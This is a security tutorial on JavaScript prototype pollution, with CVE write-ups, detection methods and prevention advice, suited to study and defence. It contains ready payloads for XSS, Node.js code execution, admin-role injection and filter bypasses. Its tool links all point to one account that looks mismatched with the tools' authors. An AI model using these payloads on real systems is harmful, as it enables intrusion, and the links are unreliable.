# Prototype Pollution

Prototype pollution is a JavaScript vulnerability that allows attackers to modify the prototype of base objects, potentially leading to XSS, RCE, or DoS.

## How It Works

JavaScript uses prototypal inheritance, where objects inherit properties from other objects called prototypes. Every JavaScript object has an internal reference to another object called its prototype, and when you access a property that doesn't exist on the object, JavaScript looks for it up the prototype chain.

```javascript
// JavaScript objects inherit from Object.prototype
let obj = {};
console.log(obj.toString); // inherited from Object.prototype

// Pollution occurs when attacker controls property assignment
obj.__proto__.polluted = "yes";
// OR
obj["__proto__"]["polluted"] = "yes";
// OR
obj.constructor.prototype.polluted = "yes";

// Now ALL objects have this property
let newObj = {};
console.log(newObj.polluted); // "yes"
```

The vulnerability typically occurs when applications recursively merge objects without properly validating or sanitizing keys like `__proto__`, `constructor`, or `prototype`.

## Real-World Examples and CVEs

### CVE-2025-3982 - Sverchok (April 2025)
A vulnerability was discovered in nortikin Sverchok 1.3.0, affecting the `SvSetPropNodeMK2` function in the Set Property Mk2 Node component. The manipulation leads to improperly controlled modification of object prototype attributes, and the exploit has been publicly disclosed.

### CVE-2024-57077 - utils-extend (February 2025)
The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) `lib.extend`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) as a minimum consequence. The vulnerability carries a CVSS score of 9.1 (Critical).

**Proof of Concept:**
```javascript
async function exploit() {
   const utilsextend = require("utils-extend");
   const payload = JSON.parse('{"__proto__":{"exploited":true}}');
   const result = await utilsextend.extend({}, payload);
}
```

### CVE-2026-28794 - @orpc/client (March 2026)
A critical Prototype Pollution vulnerability exists in the RPC JSON deserializer of the `@orpc/client` package. The vulnerability allows unauthenticated, remote attackers to inject arbitrary properties into the global `Object.prototype`. Because this pollution persists for the lifetime of the Node.js process and affects all objects, it can lead to authentication bypass, denial of service, and potentially Remote Code Execution.

**Root Cause:** The `deserialize()` method of `StandardRPCJsonSerializer` fails to implement validation or sanitization for dangerous JavaScript object keys, specifically `__proto__` and `constructor`. There are two primary write vectors:
- The `meta` vector: Writes type-constrained values to arbitrary object paths
- The `maps` vector: Allows injection of arbitrary string values

**Proof of Concept:**
```bash
curl -X POST http://localhost:4321/rpc/planet/create \
     -F 'data={"json":{},"meta":[],"maps":[["__proto__","role"]]}' \
     -F '0=admin'
```

This immediately applies `Object.prototype.role = "admin"` across the entire Node.js server instance.

### CVE-2026-25150 - Qwik Framework (February 2026)
A critical prototype pollution vulnerability exists in the QwikDev qwik JavaScript framework versions prior to 1.19.0. The flaw exists in the `formToObj()` function of the `@builder.io/qwik-city` middleware, which improperly processes form field names containing dot notation without sanitizing dangerous property names like `__proto__`, `constructor`, and `prototype`.

This allows unauthenticated attackers to send crafted HTTP POST requests that modify `Object.prototype`, potentially leading to privilege escalation, authentication bypass, or denial of service. The vulnerability has a CVSS score of 9.3 (Critical).

### PortSwigger Research - Third-Party Library Gadgets
PortSwigger Research has demonstrated widespread prototype pollution gadgets in third-party libraries. A notable lab environment shows how DOM Invader can identify prototype pollution vectors in the `hash` property (URL fragment string) and exploit `setTimeout()` via the `hitCallback` gadget.

**Exploit Example:**
```javascript
location="https://target.com/#__proto__[hitCallback]=alert%28document.cookie%29"
```

## Detection

### Manual Testing

```javascript
// Test in browser console or via URL parameters
// Check if prototype is pollutable

// Via URL query string
?__proto__[test]=polluted
?__proto__.test=polluted
?constructor[prototype][test]=polluted

// Via JSON body
{"__proto__": {"test": "polluted"}}
{"constructor": {"prototype": {"test": "polluted"}}}

// Verify pollution
Object.prototype.test === "polluted"
```

### Server-Side Detection Technique

When testing for server-side prototype pollution vulnerabilities, use benign payloads that don't interfere with critical application logic to avoid causing a denial of service:

```json
{
    "__proto__": {
        "status": 499
    }
}
```

**Detection Steps:**
1. Send a request with a broken JSON payload, observe the response code (typically 400)
2. Send the status payload to attempt to change the standard status code
3. Resend the broken JSON and observe the response code

If the response code is 499, prototype pollution has been achieved. This change can be reverted by sending the status again with the value of 0.

### Automated Detection

```bash
# PPScan - Prototype Pollution Scanner
# https://github.com/AhmedMohamedDev/PPScan
python3 ppscan.py -u "https://target.com/?param=value"

# Client-side prototype pollution scanner
# https://github.com/AhmedMohamedDev/ClientSidePrototypePollution
node ClientSidePrototypePollution.js -u "https://target.com"

# Burp extension - Server-Side Prototype Pollution Scanner
# https://github.com/AhmedMohamedDev/Burp-PrototypePollutionScanner

# ppmap - Prototype Pollution Exploiter
# https://github.com/AhmedMohamedDev/ppmap
ppmap -u "https://target.com"
```

### DOM Invader for Client-Side Detection

PortSwigger's DOM Invader (integrated in Burp Suite's built-in browser) can automatically identify prototype pollution vectors:
1. Load the target in Burp's built-in browser
2. Open DevTools and go to the DOM Invader tab
3. Reload the page to identify prototype pollution vectors
4. Click "Scan for gadgets" to find exploitable sinks
5. Use the "Exploit" button to generate proof-of-concept exploits

## Common Sinks (Client-Side)

```javascript
// Object.assign
Object.assign({}, userInput);

// Lodash merge (before 4.17.21)
_.merge({}, userInput);
_.set({}, path, value);
_.setWith({}, path, value);

// jQuery extend
$.extend(true, {}, userInput);

// Deep merge libraries
deepmerge({}, userInput);
```

## Exploitation Payloads

### DOM XSS via Prototype Pollution

```javascript
// If application uses innerHTML with polluted properties
?__proto__[innerHTML]=<img/src/onerror=alert(1)>

// Pollute srcdoc for iframes
?__proto__[srcdoc]=<script>alert(1)</script>

// Pollute href for anchors
?__proto__[href]=javascript:alert(1)

// setTimeout gadget (PortSwigger research)
?__proto__[hitCallback]=alert(document.cookie)
```

### Gadgets for Common Libraries

```javascript
// jQuery < 3.4.0 (CVE-2019-11358)
$.extend(true, {}, JSON.parse('{"__proto__": {"test": "alert(1)"}}'));

// Lodash < 4.17.12 (CVE-2019-10744)
_.template('', {variable: 'x'}); // with polluted sourceURL
?__proto__[sourceURL]=\u000aAlert(1)//

// Vue.js
?__proto__[v-if]=_c.constructor('alert(1)')()

// Handlebars
?__proto__[pendingContent]=<script>alert(1)</script>

// Pug/Jade
?__proto__[block]={"type":"Text","val":"<script>alert(1)</script>"}
```

### Server-Side Prototype Pollution (Node.js)

```javascript
// RCE via child_process
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}

// RCE via env pollution
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}}

// DoS via constructor pollution
{"__proto__": {"toString": "not a function"}}

// Authentication bypass via polluted role property (CVE-2026-28794)
// After polluting Object.prototype.role = "admin", all users are treated as admins
```

### Targeted Property Pollution

Finding the right properties to target often requires techniques such as API response analysis, fuzzing, and source code review:

**Potential targets to test:**
- `isAdmin`, `userRole`, `permissions` - Access control properties
- `debug`, `loggingLevel`, `enabled` - Configuration flags
- `status`, `statusCode` - Error handling properties
- `toString`, `valueOf`, `constructor` - Built-in method properties

**Example targeted payload:**
```json
{
  "__proto__": {
    "isAdmin": true,
    "loggingLevel": "debug",
    "userRole": "superuser"
  }
}
```

## Bypass Techniques

```javascript
// Alternative property paths
constructor.prototype.polluted=1
__proto__.polluted=1
__proto__[polluted]=1

// Unicode encoding
\u005f\u005fproto\u005f\u005f

// Mixed case (rare)
__PROTO__

// Array pollution
[].__proto__.polluted=1

// Nested prototype chains
{"__proto__":{"__proto__":{"polluted":true}}}
```

## Step-by-Step Exploitation Strategy

Based on CTF and real-world exploitation methodology:

**Step 1: Recognize the Challenge Setup**
- Identify if the application extends/modifies objects using functions like `Object.assign()`, `$.extend()`, `_.merge()`
- Trace the flow of user input into object properties or their prototypes

**Step 2: Identify Entry Points**
- Check URL query parameters, JSON bodies, form data
- Look for object merging operations that accept user-controlled data

**Step 3: Pollute the Prototype**
- Inject malicious property using payloads like `?__proto__[polluted_property]=malicious_value`
- Verify pollution by checking `Object.prototype.polluted_property`

**Step 4: Find the Gadget**
- Look for code that uses dynamic properties which can be controlled
- Common gadget sinks: `innerHTML`, `outerHTML`, `eval()`, `setTimeout()`, `document.write()`
- Inspect JavaScript files for dynamic property usage

**Step 5: Craft an XSS Payload**
- Once a gadget is found, inject an XSS payload through prototype pollution
- Example: `?__proto__[innerHTML]=<img src=x onerror=alert(1)>`

**Step 6: Test for Exploitation**
- Inject malicious property like `__proto__[innerHTML]` or `constructor`
- Check if the property gets reflected in the DOM or executed

## Impact Severity

Prototype pollution vulnerabilities can have critical impacts depending on the context:

- **Denial of Service (DoS):** Overwriting critical properties can lead to application crashes and unhandled exceptions. This is particularly common in server-side environments where pollution affects the entire application instance.

- **Privilege Escalation / Authentication Bypass:** Attackers can bypass flawed security checks by polluting properties like `isAdmin`, `userRole`, or `authenticated`. For example, if the server relies on a defaulted property check like `if (user.role === "admin")`, polluting `Object.prototype.role = "admin"` makes this evaluate to true for all users globally.

- **Property Override:** Attackers can modify existing properties, leading to unexpected behavior and potentially bypassing security checks.

- **Remote Code Execution (RCE):** In certain circumstances, prototype pollution can be chained with other vulnerabilities (gadgets) to achieve remote code execution. Libraries and frameworks often use specific properties in their internal logic, making them potential targets for exploitation.

- **Data Leakage:** With certain payloads, attackers might gain unauthorized access to sensitive data.

## Prevention

Mitigating prototype pollution requires a multi-pronged approach:

- **Avoid using `__proto__`:** Refactor code to avoid using `__proto__` directly. Modern JavaScript offers safer alternatives like `Object.create()` and `Object.getPrototypeOf()`.

- **Validate User Input:** Sanitize all user-supplied data, particularly when used in recursive merging functions. Reject or neutralize form field names containing dangerous prototype properties like `__proto__`, `constructor`, and `prototype`.

- **Use `Object.freeze()`:** Freezing objects, particularly prototypes, prevents further modification. `Object.freeze(Object.prototype)` prevents pollution of the base prototype.

- **Use Map Instead of Plain Objects:** For dynamic property assignment, using `Map` objects provides a safer alternative, as they don't inherit from `Object.prototype`.

- **Secure Libraries and Frameworks:** Keep libraries and frameworks updated to patch known vulnerabilities related to prototype pollution.

- **Static Analysis Tools:** Integrate static analysis tools into the development workflow to detect potential vulnerabilities early in the development cycle.

- **Web Application Firewalls (WAFs):** Employ WAFs with custom rules to detect and block suspicious HTTP requests attempting to exploit prototype pollution patterns.

- **Regular Security Audits:** Perform regular security audits and penetration testing to identify and address vulnerabilities in the application.

## Tools & Resources

```bash
# Scanning
https://github.com/AhmedMohamedDev/PPScan
https://github.com/AhmedMohamedDev/ClientSidePrototypePollution
https://github.com/AhmedMohamedDev/ppmap

# Gadget database
https://github.com/AhmedMohamedDev/client-side-prototype-pollution

# Burp Extension
https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8

# DOM Invader (built into Burp Suite)
# Integrated in Burp's built-in browser DevTools
```

## Related Topics

- XSS - Prototype pollution often chains to XSS
- Deserialization - Similar object manipulation concepts
- SSTI - Template engines can be affected
